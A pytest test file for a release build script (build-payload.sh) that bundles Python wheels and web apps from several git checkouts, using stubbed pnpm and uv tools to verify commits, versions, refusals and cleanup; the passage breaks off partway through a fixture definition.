"""scripts/build-payload.sh against throwaway checkouts.

Five fake repositories stand in for canopy, canopy-screen-runtime,
canopy-sdk-js, pydm-converter-tool and react-trace. ``pnpm``, ``uv`` and
``uvx`` are PATH stubs that log every call (tool, working directory, argv) and
write the artifact the real tool would, built from the files they find in
their working directory, so the payload's content shows which tree was built.
The runtime and Trace each commit a ``pnpm-lock.yaml`` resolving the SDK's packages;
the SDK's packs sit in SDK_PACKS, and the lockfiles name their integrity, as a
re-resolved lockfile does after the pack install.
"""

from __future__ import annotations

import os
import json
import base64
import shutil
import hashlib
import subprocess
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
SCRIPT = REPO / "scripts" / "build-payload.sh"
SDK_VERSION = "0.3.1-als.1"
# The pack bytes of each SDK package, and the integrity pnpm records for them.
PACKAGES = ("charts", "client", "react", "screen-ir", "shell", "vite")
PACK_BYTES = {package: f"pack of {package}\n".encode() for package in PACKAGES}
INTEGRITY = {
    package: "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
    for package, data in PACK_BYTES.items()
}
NPMRC = ""
INSTALL = "install --no-frozen-lockfile --ignore-scripts --ignore-pnpmfile"


def lockfile(entries: dict[str, tuple[str, str]], workspace: tuple[str, ...] = ()) -> str:
    """A pnpm lockfile whose packages section holds ``{package: (version, integrity)}``.

    Laid out as a real one: the importers and snapshots sections name the same
    packages, with peers, and ``workspace`` packages are links in the importers.
    """
    lines = ["lockfileVersion: '9.0'", "", "importers:", "", "  .:", "    dependencies:"]
    for package, (version, _) in entries.items():
        lines += [
            f"      '@slaclab/canopy-{package}':",
            f"        specifier: ^{version}",
            f"        version: {version}",
        ]
    for package in workspace:
        lines += [
            f"      '@slaclab/canopy-{package}':",
            "        specifier: workspace:^",
            f"        version: link:packages/{package}",
        ]
    lines += [
        "",
        "packages:",
        "",
        "  '@rolldown/pluginutils@1.0.1':",
        "    resolution: {integrity: sha512-other==}",
        "",
    ]
    for package, (version, integrity) in entries.items():
        lines += [
            f"  '@slaclab/canopy-{package}@{version}':",
            f"    resolution: {{integrity: {integrity}}}",
            "    peerDependencies:",
            "      react: ^19.0.0",
            "",
        ]
    lines += ["snapshots:", ""]
    for package, (version, _) in entries.items():
        lines += [
            f"  '@slaclab/canopy-{package}@{version}(react@19.2.7)':",
            "    dependencies:",
            "      react: 19.2.7",
            "",
        ]
    return "\n".join(lines) + "\n"


def sdk_lock(*packages: str, workspace: tuple[str, ...] = (), **changed: tuple[str, str]) -> str:
    """A lockfile resolving ``packages`` to the release; ``changed`` overrides single entries."""
    return lockfile({p: changed.get(p, (SDK_VERSION, INTEGRITY[p])) for p in packages}, workspace)


RT_PACKAGES = ("client", "react", "screen-ir", "shell")
TRACE_PACKAGES = ("charts", "client", "react", "shell", "vite")
RT_LOCK = sdk_lock(*RT_PACKAGES, workspace=("screen-runtime",))
CHARTS_PEERS = f"  '@slaclab/canopy-charts@{SDK_VERSION}':\n    resolution: {{integrity: {INTEGRITY['charts']}}}\n    peerDependencies:\n"


def trace_lock(lock: str, peer: str = "shell") -> str:
    """``lock`` laid out as react-trace's: charts names ``peer`` as a peer, vite is a dev dependency."""
    lock = lock.replace(CHARTS_PEERS, f"{CHARTS_PEERS}      '@slaclab/canopy-{peer}': ^{SDK_VERSION}\n", 1)
    return lock.replace("      '@slaclab/canopy-vite':", "    devDependencies:\n      '@slaclab/canopy-vite':", 1)


TRACE_LOCK = trace_lock(sdk_lock(*TRACE_PACKAGES))

UV_STUB = r"""#!/bin/sh
printf 'uv\t%s\t%s\tTOKEN=%s\n' "$PWD" "$*" "${NODE_AUTH_TOKEN:+set}" >> "$STUB_LOG"
[ "$1 $2" = "build --wheel" ] || exit 97
[ -z "${STUB_FAIL_UV:-}" ] || exit 1
out="$4"
if grep -q PyDMConverter pyproject.toml; then
    name=pydmconverter; version="${SETUPTOOLS_SCM_PRETEND_VERSION_FOR_PYDMCONVERTER:-unset}"
else
    name=canopy; version="${SETUPTOOLS_SCM_PRETEND_VERSION_FOR_CANOPY:-unset}"
    [ "${SETUPTOOLS_SCM_PRETEND_VERSION:-unset}" = "$version" ] || exit 96
fi
cat marker.txt > "$out/$name-$version-py3-none-any.whl"
ls > "$out/$name.files"
"""

# Like setuptools_scm, the version names the HEAD of the directory it runs in as
# ``+g<7 hex>``; STUB_SCM_VERSION replaces it outright.
UVX_STUB = r"""#!/bin/sh
printf 'uvx\t%s\t%s\tTOKEN=%s\n' "$PWD" "$*" "${NODE_AUTH_TOKEN:+set}" >> "$STUB_LOG"
[ -z "${STUB_SCM_VERSION:-}" ] || { echo "$STUB_SCM_VERSION"; exit 0; }
node="$(git rev-parse HEAD | cut -c1-7)"
if grep -q PyDMConverter pyproject.toml; then echo "4.5.6+g$node"; else echo "1.2.3.dev4+g$node"; fi
"""

# ``pnpm --version`` answers STUB_PNPM_VERSION (default 11.1.1) and is not logged.
PNPM_STUB = r"""#!/bin/sh
[ "$*" != "--version" ] || { echo "${STUB_PNPM_VERSION:-11.1.1}"; exit 0; }
printf 'pnpm\t%s\t%s\tTRACE=%s HUSKY=%s PM=%s TOKEN=%s\n' "$PWD" "$*" "${TRACE:-unset}" "${HUSKY:-unset}" "${pnpm_config_manage_package_manager_versions:-unset}" "${NODE_AUTH_TOKEN:+set}" >> "$STUB_LOG"
case "$*" in
    "install --no-frozen-lockfile --ignore-scripts --ignore-pnpmfile")
        cat .npmrc >> "$STUB_LOG.npmrc" || exit 94
        cat pnpm-workspace.yaml >> "$STUB_LOG.workspace" || exit 93
        case "${STUB_FAIL_INSTALL:-}" in "$(basename "$PWD")") exit 1 ;; esac
        ;;
    "run build")
        [ -d apps/viewer ] || exit 97
        [ -z "${STUB_FAIL_VIEWER:-}" ] || exit 1
        mkdir -p apps/viewer/dist
        cat marker.txt > apps/viewer/dist/index.html
        cp packages/runtime/ir-map.json apps/viewer/dist/ir-map.json
        ;;
    "exec tsc -b") ;;
    "exec vite build --base=./")
        mkdir -p dist
        cat marker.txt > dist/index.html
        ;;
    "run check-dist")
        [ -z "${STUB_FAIL_CHECK_DIST:-}" ] || exit 1
        ;;
    *) exit 97 ;;
esac
"""


def git(cwd: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "commit.gpgsign=false", *args],
        cwd=cwd,
        check=True,
        capture_output=True,
        text=True,
    ).stdout.strip()


def write(repo: Path, files: dict[str, str]) -> None:
    for name, text in files.items():
        f = repo / name
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text)


def commit(repo: Path, files: dict[str, str], message: str) -> str:
    write(repo, files)
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", message)
    return git(repo, "rev-parse", "HEAD")


def make_repo(path: Path, files: dict[str, str]) -> Path:
    """A repo with two commits; ``marker.txt`` reads ``<name> v1`` then ``<name> v2``."""
    path.mkdir(parents=True)
    git(path, "init", "-q", "-b", "main")
    commit(path, {**files, "marker.txt": f"{path.name} v1\n"}, "one")
    commit(path, {"marker.txt": f"{path.name} v2\n"}, "two")
    return path


def head(path: Path) -> str:
    return git(path, "rev-parse", "HEAD")


def first(path: Path) -> str:
    return git(path, "rev-parse", "HEAD~1")


def canopy_version(world: dict) -> str:
    """The version the uvx stub computes for the canopy checkout's HEAD."""
    return f"1.2.3.dev4+g{head(world['canopy'])[:7]}"


def pydm_version(world: dict) -> str:
    return f"4.5.6+g{head(world['pydm'])[:7]}"


# The runtime's ir-map.json carries the editor metadata the catalog is built from.
IR_MAP = '{"arc": {"consumes": [], "verbatim": true, "displayName": "Arc"}}\n'
SPEC_SHA = "0123456789abcdef0123456789abcdef01234567"


def make_spec(root: Path, schema: str = "{}\n") -> Path:
    """A staged spec directory: ``SPEC-SOURCE``, ``ir/`` and ``widgets/``."""
    write(
        root,
        {
            "SPEC-SOURCE": f"repo: slaclab/canopy-spec\nsha: {SPEC_SHA}\n",
            "ir/screen-ir-1.1.schema.json": schema,
            "widgets/arc.props.schema.json": '{"type": "object"}\n',
        },
    )
    return root


def wheel_names(world: dict) -> list[str]:
    return [
        f"canopy-{canopy_version(world)}-py3-none-any.whl",
        f"pydmconverter-{pydm_version(world)}-py3-none-any.whl",
    ]


@pytest.fixture
def world(tmp_path: Path) -> dict:
    src = tmp_path / "src"
    canopy = src / "canopy"
    (canopy / "scripts").mkdir(parents=True)
    shutil.copy2(SCRIPT, canopy / "scripts" / "build-payload.sh")
    make_canopy = {"pyproject.toml": "[project]\nname='canopy'\n"}
    git(canopy, "init", "-q", "-b", "main")
    commit(canopy, {**make_canopy, "marker.txt": "canopy v1\n"}, "one")
    commit(canopy, {"marker.txt": "canopy v2\n"}, "two")

    pydm = make_repo(src / "pydm-converter-tool", {"pyproject.toml": "[project]\nname='PyDMConverter'\n"})
    # A version is computed only from a commit a tag is reachable from.
    git(canopy, "tag", "v1.2.2", "HEAD~1")
    git(pydm, "tag", "v4.5.5", "HEAD~1")
    sdk = make_repo(
        src / "canopy-sdk-js",
        {
            "package.json": "{}\n",
            **{
                f"packages/{package}/package.json": json.dumps(
                    {"name": f"@slaclab/canopy-{package}", "version": SDK_VERSION}
                )
                for package in INTEGRITY
            },
        },
    )
    rt_files = {
        "package.json": "{}\n",
        "pnpm-lock.yaml": RT_LOCK,
        "apps/viewer/package.json": "{}\n",
        "packages/runtime/ir-map.json": IR_MAP,
    }
    rt = make_repo(src / "canopy-screen-runtime", rt_files)
    trace = make_repo(src / "react-trace", {"package.json": "{}\n", "pnpm-lock.yaml": TRACE_LOCK})
    git(trace, "branch", "feature", "HEAD~1")

    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    for tool, text in (("uv", UV_STUB), ("uvx", UVX_STUB), ("pnpm", PNPM_STUB)):
        stub = bin_dir / tool
        stub.write_text(text)
        stub.chmod(0o755)

    packs = tmp_path / "packs"
    packs.mkdir()
    for package, data in PACK_BYTES.items():
        (packs / f"slaclab-canopy-{package}-{SDK_VERSION}.tgz").write_bytes(data)

    scratch = tmp_path / "scratch"
    scratch.mkdir()
    log = tmp_path / "stub.log"
    dropped = {
        "PYDM", "RT", "SDK", "SDK_SHA", "TRACE", "TRACE_REF", "CANOPY_SHA", "RT_SHA", "PYDM_SHA",
        "CANOPY_VERSION", "PYDM_VERSION", "HUSKY", "SPEC", "NODE_AUTH_TOKEN", "SDK_PACKS",
    }  # fmt: skip
    env = {k: v for k, v in os.environ.items() if k not in dropped}
    env["PATH"] = f"{bin_dir}{os.pathsep}{env.get('PATH', '')}"
    env["TMPDIR"] = str(scratch)
    env.update(
        PYDM=str(pydm),
        RT=str(rt),
        SDK=str(sdk),
        TRACE=str(trace),
        TRACE_REF="main",
        SDK_PACKS=str(packs),
        STUB_LOG=str(log),
    )
    return {
        "canopy": canopy,
        "pydm": pydm,
        "sdk": sdk,
        "rt": rt,
        "trace": trace,
        "repos": [canopy, pydm, sdk, rt, trace],
        "env": env,
        "packs": packs,
        "log": log,
        "scratch": scratch,
        "out": tmp_path / "out",
    }


def build(
    world: dict, *args: str, unset: tuple[str, ...] = (), out: Path | bool | None = None, tag: bool = True, **extra: str
):
    # SDK_SHA has no default in the script; here it is the SDK's HEAD unless a test says otherwise,
    # and the release tag names it unless the test is about the tag.
    env = {k: v for k, v in {**world["env"], "SDK_SHA": head(world["sdk"])}.items() if k not in unset}
    env.update(extra)
    if tag:
        target = env.get("SDK_SHA", "HEAD")
        if not subprocess.run(
            ["git", "cat-file", "-e", f"{target}^{{commit}}"], cwd=world["sdk"], capture_output=True
        ).returncode:
            git(world["sdk"], "tag", "-f", f"v{SDK_VERSION}", target)
    argv = ["bash", str(world["canopy"] / "scripts" / "build-payload.sh"), *args]
    if out is not False:
        argv.append(str(out or world["out"]))
    return subprocess.run(argv, env=env, capture_output=True, text=True, timeout=120)


def ok(proc) -> None:
    assert proc.returncode == 0, proc.stdout + proc.stderr


def calls(world: dict) -> list[tuple[str, Path, str, str]]:
    """Logged stub calls as (tool, cwd, argv, env note)."""
    if not world["log"].exists():
        return []
    rows = []
    for line in world["log"].read_text().splitlines():
        tool, cwd, argv, *rest = line.split("\t")
        rows.append((tool, Path(cwd), argv, rest[0] if rest else ""))
    return rows


def resolved_entry(package: str) -> dict:
    return {"version": SDK_VERSION, "integrity": INTEGRITY[package]}


def staged(world: dict) -> dict:
    return json.loads((world["out"] / "STAGED.json").read_text())


# --- the payload ---------------------------------------------------------------


def test_payload_holds_wheels_viewer_trace_and_staged(world):
    ok(build(world))
    out = world["out"]
    assert sorted(p.name for p in out.glob("*.whl")) == wheel_names(world)
    assert (out / "viewer" / "index.html").read_text() == "canopy-screen-runtime v2\n"
    assert json.loads((out / "viewer" / "ir-map.json").read_text()) == json.loads(IR_MAP)
    assert (out / "trace" / "index.html").read_text() == "react-trace v2\n"
    assert not (out / "widgets").exists()
    assert not (out / "spec").exists()
    assert (out / "STAGED.json").is_file()


def test_staged_names_five_commits_and_both_versions(world):
    ok(build(world))
    assert staged(world) == {
        "canopy": head(world["canopy"]),
        "runtime": head(world["rt"]),
        "sdk": head(world["sdk"]),
        "sdk_packages": {
            "runtime": {f"@slaclab/canopy-{p}": resolved_entry(p) for p in RT_PACKAGES},
            "trace": {f"@slaclab/canopy-{p}": resolved_entry(p) for p in TRACE_PACKAGES},
        },
        "pydm": head(world["pydm"]),
        "trace": head(world["trace"]),
        "canopy_version": canopy_version(world),
        "pydm_version": pydm_version(world),
        "spec": None,
        "spec-digest": None,
        "fixtures": "absent",
        "workspace": "absent",
        "vectors": "absent",
    }


def test_trace_ref_is_resolved_to_its_commit(world):
    ok(build(world, TRACE_REF="feature"))
    assert staged(world)["trace"] == first(world["trace"])
    assert (world["out"] / "trace" / "index.html").read_text() == "react-trace v1\n"


def test_recorded_shas_are_built_instead_of_head(world):
    shas = {
        "CANOPY_SHA": first(world["canopy"]),
        "RT_SHA": first(world["rt"]),
        "SDK_SHA": first(world["sdk"]),
        "PYDM_SHA": first(world["pydm"]),
    }
    # Given versions are used as is, whichever commit is built.
    versions = {"CANOPY_VERSION": "1.2.2", "PYDM_VERSION": "4.5.5"}
    ok(build(world, **shas, **versions, TRACE_REF="feature"))
    out = world["out"]
    s = staged(world)
    assert (s["canopy"], s["runtime"], s["sdk"], s["pydm"]) == tuple(shas.values())
    assert s["trace"] == first(world["trace"])
    assert (s["canopy_version"], s["pydm_version"]) == ("1.2.2", "4.5.5")
    assert (out / "canopy-1.2.2-py3-none-any.whl").read_text() == "canopy v1\n"
    assert (out / "pydmconverter-4.5.5-py3-none-any.whl").read_text() == "pydm-converter-tool v1\n"
    assert (out / "viewer" / "index.html").read_text() == "canopy-screen-runtime v1\n"


def test_short_sha_is_recorded_in_full(world):
    full = first(world["rt"])
    ok(build(world, RT_SHA=full[:10]))
    assert staged(world)["runtime"] == full


# --- detached exports ---------------------------------------------------------------


def test_builds_run_only_in_exports_under_one_root(world):
    ok(build(world))
    builds = [(tool, cwd, argv) for tool, cwd, argv, _ in calls(world) if tool != "uvx"]
    assert builds
    roots = set()
    seen = set()
    for _tool, cwd, _argv in builds:
        seen.add(cwd.name)
        roots.add(cwd.parent)
    # The SDK comes from the registry: it is never built.
    assert seen == {r.name for r in world["repos"]} - {world["sdk"].name}
    assert len(roots) == 1
    root = roots.pop()
    assert world["scratch"].resolve() in root.parents
    assert not any(src in cwd.parents or src == cwd for _, cwd, _ in builds for src in world["repos"])


def test_the_runtime_installs_its_lockfile_then_builds(world):
    ok(build(world))
    runtime = [argv for tool, cwd, argv, _ in calls(world) if tool == "pnpm" and cwd.name == "canopy-screen-runtime"]
    assert runtime == [INSTALL, "run build"]


def test_trace_is_built_with_its_own_build_steps(world):
    ok(build(world))
    trace = [argv for tool, cwd, argv, _ in calls(world) if tool == "pnpm" and cwd.name == "react-trace"]
    assert trace == [
        INSTALL,
        "exec tsc -b",
        "exec vite build --base=./",
        "run check-dist",
    ]


def test_pnpm_never_sees_trace_and_husky_is_off(world):
    ok(build(world))
    notes = {note for tool, _, _, note in calls(world) if tool == "pnpm"}
    assert {note.rsplit(" ", 1)[0] for note in notes} == {"TRACE=unset HUSKY=0 PM=false"}


def test_uncommitted_edits_are_absent_from_the_payload(world):
    for repo in world["repos"]:
        (repo / "marker.txt").write_text(f"{repo.name} EDITED\n")  # tracked, modified
        (repo / "untracked.txt").write_text("x\n")
    (world["rt"] / "packages" / "runtime" / "ir-map.json").write_text('{"EDITED": {"displayName": "E"}}\n')
    git(world["sdk"], "add", "-A")  # staged, not committed

    ok(build(world))
    out = world["out"]
    texts = [p.read_text() for p in out.rglob("*") if p.is_file()]
    assert not any("EDITED" in t for t in texts)
    assert "untracked.txt" not in (out / "canopy.files").read_text()
    assert "untracked.txt" not in (out / "pydmconverter.files").read_text()
    assert staged(world)["canopy"] == head(world["canopy"])


def test_checkouts_are_left_untouched(world):
    before = {r: git(r, "status", "--porcelain", "--ignored") for r in world["repos"]}
    ok(build(world))
    assert {r: git(r, "status", "--porcelain", "--ignored") for r in world["repos"]} == before
    assert not (world["rt"] / "apps" / "viewer" / "dist").exists()
    assert not (world["trace"] / "dist").exists()


def test_temp_root_is_removed(world):
    ok(build(world))
    assert list(world["scratch"].iterdir()) == []
    assert build(world, out=world["out"].parent / "second", STUB_FAIL_VIEWER="1").returncode != 0
    assert list(world["scratch"].iterdir()) == []


# --- versions ----------------------------------------------------------------------


def test_versions_come_from_the_source_checkouts_and_are_pretended(world):
    ok(build(world))
    scm = [(cwd, argv) for tool, cwd, argv, _ in calls(world) if tool == "uvx"]
    # Each runs in a throwaway clone under the one temp root, never in the checkout.
    assert [cwd.name for cwd, _ in scm] == ["canopy", "PyDMConverter"]
    assert all(world["scratch"].resolve() in cwd.parents for cwd, _ in scm)
    assert all("setuptools_scm" in argv for _, argv in scm)
    # The uv stub names each wheel after the pretended version it was handed.
    names = sorted(p.name for p in world["out"].glob("*.whl"))
    assert names == wheel_names(world)
    first_build = next(i for i, c in enumerate(calls(world)) if c[0] != "uvx")
    assert all(c[0] != "uvx" for c in calls(world)[first_build:])  # versions before any export is built


def test_given_versions_are_used_as_they_are(world):
    proc = build(world, CANOPY_VERSION="7.0.0", PYDM_VERSION="8.0.0")
    ok(proc)
    assert not [c for c in calls(world) if c[0] == "uvx"]
    assert "canopy version 7.0.0 (given by CANOPY_VERSION" in proc.stderr
    assert "PyDMConverter version 8.0.0 (given by PYDM_VERSION" in proc.stderr
    s = staged(world)
    assert (s["canopy_version"], s["pydm_version"]) == ("7.0.0", "8.0.0")
    assert (world["out"] / "canopy-7.0.0-py3-none-any.whl").is_file()
    assert (world["out"] / "pydmconverter-8.0.0-py3-none-any.whl").is_file()


# --- --no-trace --------------------------------------------------------------------


def test_no_trace_needs_no_trace_checkout(world):
    ok(build(world, "--no-trace", unset=("TRACE", "TRACE_REF")))
    out = world["out"]
    assert staged(world)["trace"] is None
    assert (out / "trace").is_dir() and list((out / "trace").iterdir()) == []
    assert (out / "viewer" / "index.html").is_file()
    assert not [c for c in calls(world) if "vite" in c[2]]
    assert not [c for c in calls(world) if c[0] == "pnpm" and c[1].name == "canopy-sdk-js"]


# --- refusals ----------------------------------------------------------------------


@pytest.mark.parametrize("var", ["PYDM", "RT", "SDK", "SDK_SHA", "SDK_PACKS", "TRACE", "TRACE_REF"])
def test_missing_input_fails_before_any_tool_runs(world, var):
    proc = build(world, unset=(var,))
    assert proc.returncode != 0
    assert var in proc.stderr
    assert calls(world) == []
    assert not world["out"].exists()


def test_missing_out_is_a_usage_error(world):
    proc = build(world, out=False)
    assert proc.returncode == 2
    assert "Usage" in proc.stderr


def test_unknown_option_is_a_usage_error(world):
    assert build(world, "--bogus").returncode == 2


def test_help_lists_inputs(world):
    proc = build(world, "--help", out=False, unset=("PYDM", "RT", "SDK", "SDK_SHA", "SDK_PACKS", "TRACE", "TRACE_REF"))
    assert proc.returncode == 0
    for name in (
        "PYDM",
        "RT",
        "SDK",
        "SDK_PACKS",
        "TRACE",
        "TRACE_REF",
        "CANOPY_SHA",
        "RT_SHA",
        "SDK_SHA",
        "PYDM_SHA",
        "--no-trace",
    ):
        assert name in proc.stdout


@pytest.mark.parametrize("var", ["CANOPY_SHA", "RT_SHA", "SDK_SHA", "PYDM_SHA", "TRACE_REF"])
def test_unresolvable_commit_fails_naming_the_input(world, var):
    proc = build(world, **{var: "0123456789abcdef0123456789abcdef01234567"})
    assert proc.returncode != 0
    assert var in proc.stderr
    assert calls(world) == []


def test_non_empty_out_is_refused(world):
    world["out"].mkdir()
    (world["out"] / "stale.whl").write_text("old\n")
    proc = build(world)
    assert proc.returncode != 0
    assert "not empty" in proc.stderr
    assert calls(world) == []


def test_existing_empty_out_is_filled(world):
    world["out"].mkdir()
    ok(build(world))
    assert (world["out"] / "STAGED.json").is_file()


@pytest.mark.parametrize("failure", ["STUB_FAIL_UV", "STUB_FAIL_VIEWER"])
def test_failed_build_leaves_no_payload(world, failure):
    proc = build(world, **{failure: "1"})
    assert proc.returncode != 0
    assert not (world["out"] / "STAGED.json").exists()
    assert not world["out"].exists() or list(world["out"].iterdir()) == []


def test_a_trace_dist_failing_check_dist_leaves_no_payload(world):
    proc = build(world, STUB_FAIL_CHECK_DIST="1")
    assert proc.returncode != 0
    assert "failed check-dist" in proc.stderr
    assert not (world["out"] / "STAGED.json").exists()
    assert not world["out"].exists() or list(world["out"].iterdir()) == []


def test_versions_are_computed_at_the_recorded_shas_not_head(world):
    canopy, pydm = first(world["canopy"]), first(world["pydm"])
    before = {r: (git(r, "rev-parse", "HEAD"), git(r, "for-each-ref"), git(r, "worktree", "list", "--porcelain"))
              for r in (world["canopy"], world["pydm"])}  # fmt: skip
    proc = build(world, CANOPY_SHA=canopy, PYDM_SHA=pydm)
    ok(proc)
    s = staged(world)
    assert (s["canopy_version"], s["pydm_version"]) == (f"1.2.3.dev4+g{canopy[:7]}", f"4.5.6+g{pydm[:7]}")
    assert f"canopy version 1.2.3.dev4+g{canopy[:7]} (setuptools_scm at {canopy}, from tag v1.2.2)" in proc.stderr
    assert (world["out"] / f"canopy-1.2.3.dev4+g{canopy[:7]}-py3-none-any.whl").read_text() == "canopy v1\n"
    # The checkouts keep their HEAD, refs and worktrees: the clone is thrown away with the temp root.
    after = {r: (git(r, "rev-parse", "HEAD"), git(r, "for-each-ref"), git(r, "worktree", "list", "--porcelain"))
             for r in (world["canopy"], world["pydm"])}  # fmt: skip
    assert after == before
    assert list(world["scratch"].iterdir()) == []


def test_refuses_scm_version_not_matching_staged_sha(world):
    recorded = first(world["canopy"])
    proc = build(world, CANOPY_SHA=recorded, STUB_SCM_VERSION=f"1.2.3.dev4+g{head(world['canopy'])[:7]}")
    assert proc.returncode != 0
    assert f"+g{head(world['canopy'])[:7]}" in proc.stderr
    assert recorded in proc.stderr
    assert "CANOPY_VERSION" in proc.stderr
    assert [c[0] for c in calls(world)] == ["uvx"]  # refused before any export is built
    assert not world["out"].exists()


@pytest.mark.parametrize(
    ("repo", "label", "var", "where"),
    [
        ("canopy", "canopy", "CANOPY_VERSION", "v0.0.1 onward in https://github.com/slaclab/canopy"),
        ("pydm", "PyDMConverter", "PYDM_VERSION", "https://github.com/slaclab/pydm-converter-tool"),
    ],
)
def test_a_commit_without_a_reachable_tag_is_refused(world, repo, label, var, where):
    git(world[repo], "tag", "-d", "v1.2.2" if repo == "canopy" else "v4.5.5")
    proc = build(world)
    assert proc.returncode != 0
    assert f"no tag in {world[repo]} is reachable from {head(world[repo])}" in proc.stderr
    assert f"would make up the {label} version" in proc.stderr
    assert where in proc.stderr
    assert f"fetch <that repository> tag <tag>" in proc.stderr
    assert var in proc.stderr
    assert not [c for c in calls(world) if c[0] != "uvx"]  # never a made-up version, never a build
    assert not world["out"].exists()
    assert list(world["scratch"].iterdir()) == []


def test_a_tag_only_after_the_recorded_commit_is_refused(world):
    git(world["canopy"], "tag", "-d", "v1.2.2")
    git(world["canopy"], "tag", "v1.2.3", "HEAD")
    proc = build(world, CANOPY_SHA=first(world["canopy"]))
    assert proc.returncode != 0
    assert "no tag in" in proc.stderr
    assert not world["out"].exists()


def test_a_given_version_needs_no_tag_and_wins_over_the_computed_one(world):
    git(world["canopy"], "tag", "-d", "v1.2.2")
    git(world["pydm"], "tag", "-d", "v4.5.5")
    proc = build(world, CANOPY_SHA=first(world["canopy"]), CANOPY_VERSION="9.9.9", PYDM_VERSION="8.8.8",
                 STUB_SCM_VERSION="0.1.dev1+gdeadbee")  # fmt: skip
    ok(proc)
    assert not [c for c in calls(world) if c[0] == "uvx"]
    assert (staged(world)["canopy_version"], staged(world)["pydm_version"]) == ("9.9.9", "8.8.8")


def test_one_given_version_leaves_the_other_computed(world):
    proc = build(world, PYDM_VERSION="8.8.8")
    ok(proc)
    assert [cwd.name for tool, cwd, _, _ in calls(world) if tool == "uvx"] == ["canopy"]
    assert (staged(world)["canopy_version"], staged(world)["pydm_version"]) == (canopy_version(world), "8.8.8")


def test_a_shallow_checkout_is_refused(world, tmp_path):
    shallow = tmp_path / "shallow" / "canopy"
    git(tmp_path, "clone", "-q", "--depth", "1", f"file://{world['canopy']}", str(shallow))
    shutil.copy2(world["canopy"] / "scripts" / "build-payload.sh", shallow / "scripts" / "build-payload.sh")
    argv = ["bash", str(shallow / "scripts" / "build-payload.sh"), str(world["out"])]
    env = {**world["env"], "SDK_SHA": head(world["sdk"])}
    git(world["sdk"], "tag", "-f", f"v{SDK_VERSION}", "HEAD")
    proc = subprocess.run(argv, env=env, capture_output=True, text=True, timeout=120)
    assert proc.returncode != 0
    assert "is a shallow clone" in proc.stderr
    assert "CANOPY_VERSION" in proc.stderr
    assert not world["out"].exists()


def test_computed_version_without_node_is_refused(world):
    proc = build(world, STUB_SCM_VERSION="1.2.3")
    assert proc.returncode != 0
    assert "has no +g" in proc.stderr
    assert not world["out"].exists()


def test_computed_version_with_a_dirty_suffix_is_accepted(world):
    version = f"1.2.3.dev4+g{head(world['canopy'])[:7]}.d20261004"
    ok(build(world, STUB_SCM_VERSION=version, PYDM_VERSION="4.5.6"))
    assert staged(world)["canopy_version"] == version


def test_checkouts_sharing_a_directory_name_are_refused(world, tmp_path):
    twin = tmp_path / "other" / "pydm-converter-tool"
    twin.mkdir(parents=True)
    git(twin, "init", "-q", "-b", "main")
    commit(twin, {"marker.txt": "twin\n"}, "one")
    proc = build(world, TRACE=str(twin), TRACE_REF="main")
    assert proc.returncode != 0
    assert "pydm-converter-tool" in proc.stderr
    assert calls(world) == []


def test_a_linked_worktree_exports_under_its_repository_name(world, tmp_path):
    linked = tmp_path / "elsewhere" / "wt"
    linked.parent.mkdir()
    git(world["sdk"], "worktree", "add", "-q", "--detach", str(linked), "HEAD")
    ok(build(world, SDK=str(linked)))
    assert staged(world)["sdk"] == head(world["sdk"])


# --- ir-map metadata ------------------------------------------------------------------


@pytest.mark.parametrize(
    "ir_map",
    [
        '{"arc": {"consumes": []}}\n',
        '{"arc": {"displayName": "Arc"}, "frame": {"displayName": ""}}\n',
        '{"arc": "not an entry"}\n',
    ],
)
def test_an_ir_map_entry_without_display_name_fails(world, ir_map):
    commit(world["rt"], {"packages/runtime/ir-map.json": ir_map}, "no metadata")
    proc = build(world)
    assert proc.returncode != 0
    assert "without displayName" in proc.stderr
    assert not world["out"].exists() or not (world["out"] / "STAGED.json").exists()


def test_a_viewer_without_ir_map_fails(world):
    git(world["rt"], "rm", "-q", "packages/runtime/ir-map.json")
    git(world["rt"], "commit", "-q", "-m", "no ir-map")
    proc = build(world)
    assert proc.returncode != 0
    assert not (world["out"] / "STAGED.json").exists()


# --- spec -----------------------------------------------------------------------------


def test_spec_is_copied_and_recorded(world, tmp_path):
    spec = make_spec(tmp_path / "spec-src")
    ok(build(world, SPEC=str(spec)))
    out = world["out"]
    assert (out / "spec" / "SPEC-SOURCE").read_text() == (spec / "SPEC-SOURCE").read_text()
    assert (out / "spec" / "ir" / "screen-ir-1.1.schema.json").read_text() == "{}\n"
    assert (out / "spec" / "widgets" / "arc.props.schema.json").is_file()
    s = staged(world)
    assert s["spec"] == SPEC_SHA
    assert s["spec-digest"].startswith("sha256:") and len(s["spec-digest"]) == len("sha256:") + 64


def test_spec_digest_is_stable_and_follows_the_tree(world, tmp_path):
    spec = make_spec(tmp_path / "spec-src")
    ok(build(world, SPEC=str(spec)))
    one = staged(world)["spec-digest"]
    again = world["out"].parent / "again"
    ok(build(world, out=again, SPEC=str(spec)))
    assert json.loads((again / "STAGED.json").read_text())["spec-digest"] == one
    # Same SPEC-SOURCE, other bytes: the stager must see a new payload.
    (spec / "ir" / "screen-ir-1.1.schema.json").write_text('{"type": "object"}\n')
    changed = world["out"].parent / "changed"
    ok(build(world, out=changed, SPEC=str(spec)))
    s = json.loads((changed / "STAGED.json").read_text())
    assert s["spec"] == SPEC_SHA
    assert s["spec-digest"] != one


@pytest.mark.parametrize("problem", ["absent", "no-source", "no-sha"])
def test_a_bad_spec_fails_before_any_tool_runs(world, tmp_path, problem):
    spec = tmp_path / "spec-src"
    if problem != "absent":
        make_spec(spec)
        if problem == "no-source":
            (spec / "SPEC-SOURCE").unlink()
        else:
            (spec / "SPEC-SOURCE").write_text("repo: slaclab/canopy-spec\nsha: abc123\n")
    proc = build(world, SPEC=str(spec))
    assert proc.returncode != 0
    assert "SPEC=" in proc.stderr
    assert calls(world) == []
    assert not world["out"].exists()


# --- the compared collections fixture set -----------------------------------------

FIX_CANOPY = "tests/canopy_mcp/fixtures/collections"
FIX_RT = "apps/viewer/e2e/fixtures/collections"
# Bytes that are not UTF-8, as invalid/not-utf8.json is: the comparison is by bytes.
NOT_UTF8 = b'{"name": "\xff\xfe"}\n'
FIXTURE_SET = {
    "member-key-vectors.json": b'{"vectors": []}\n',
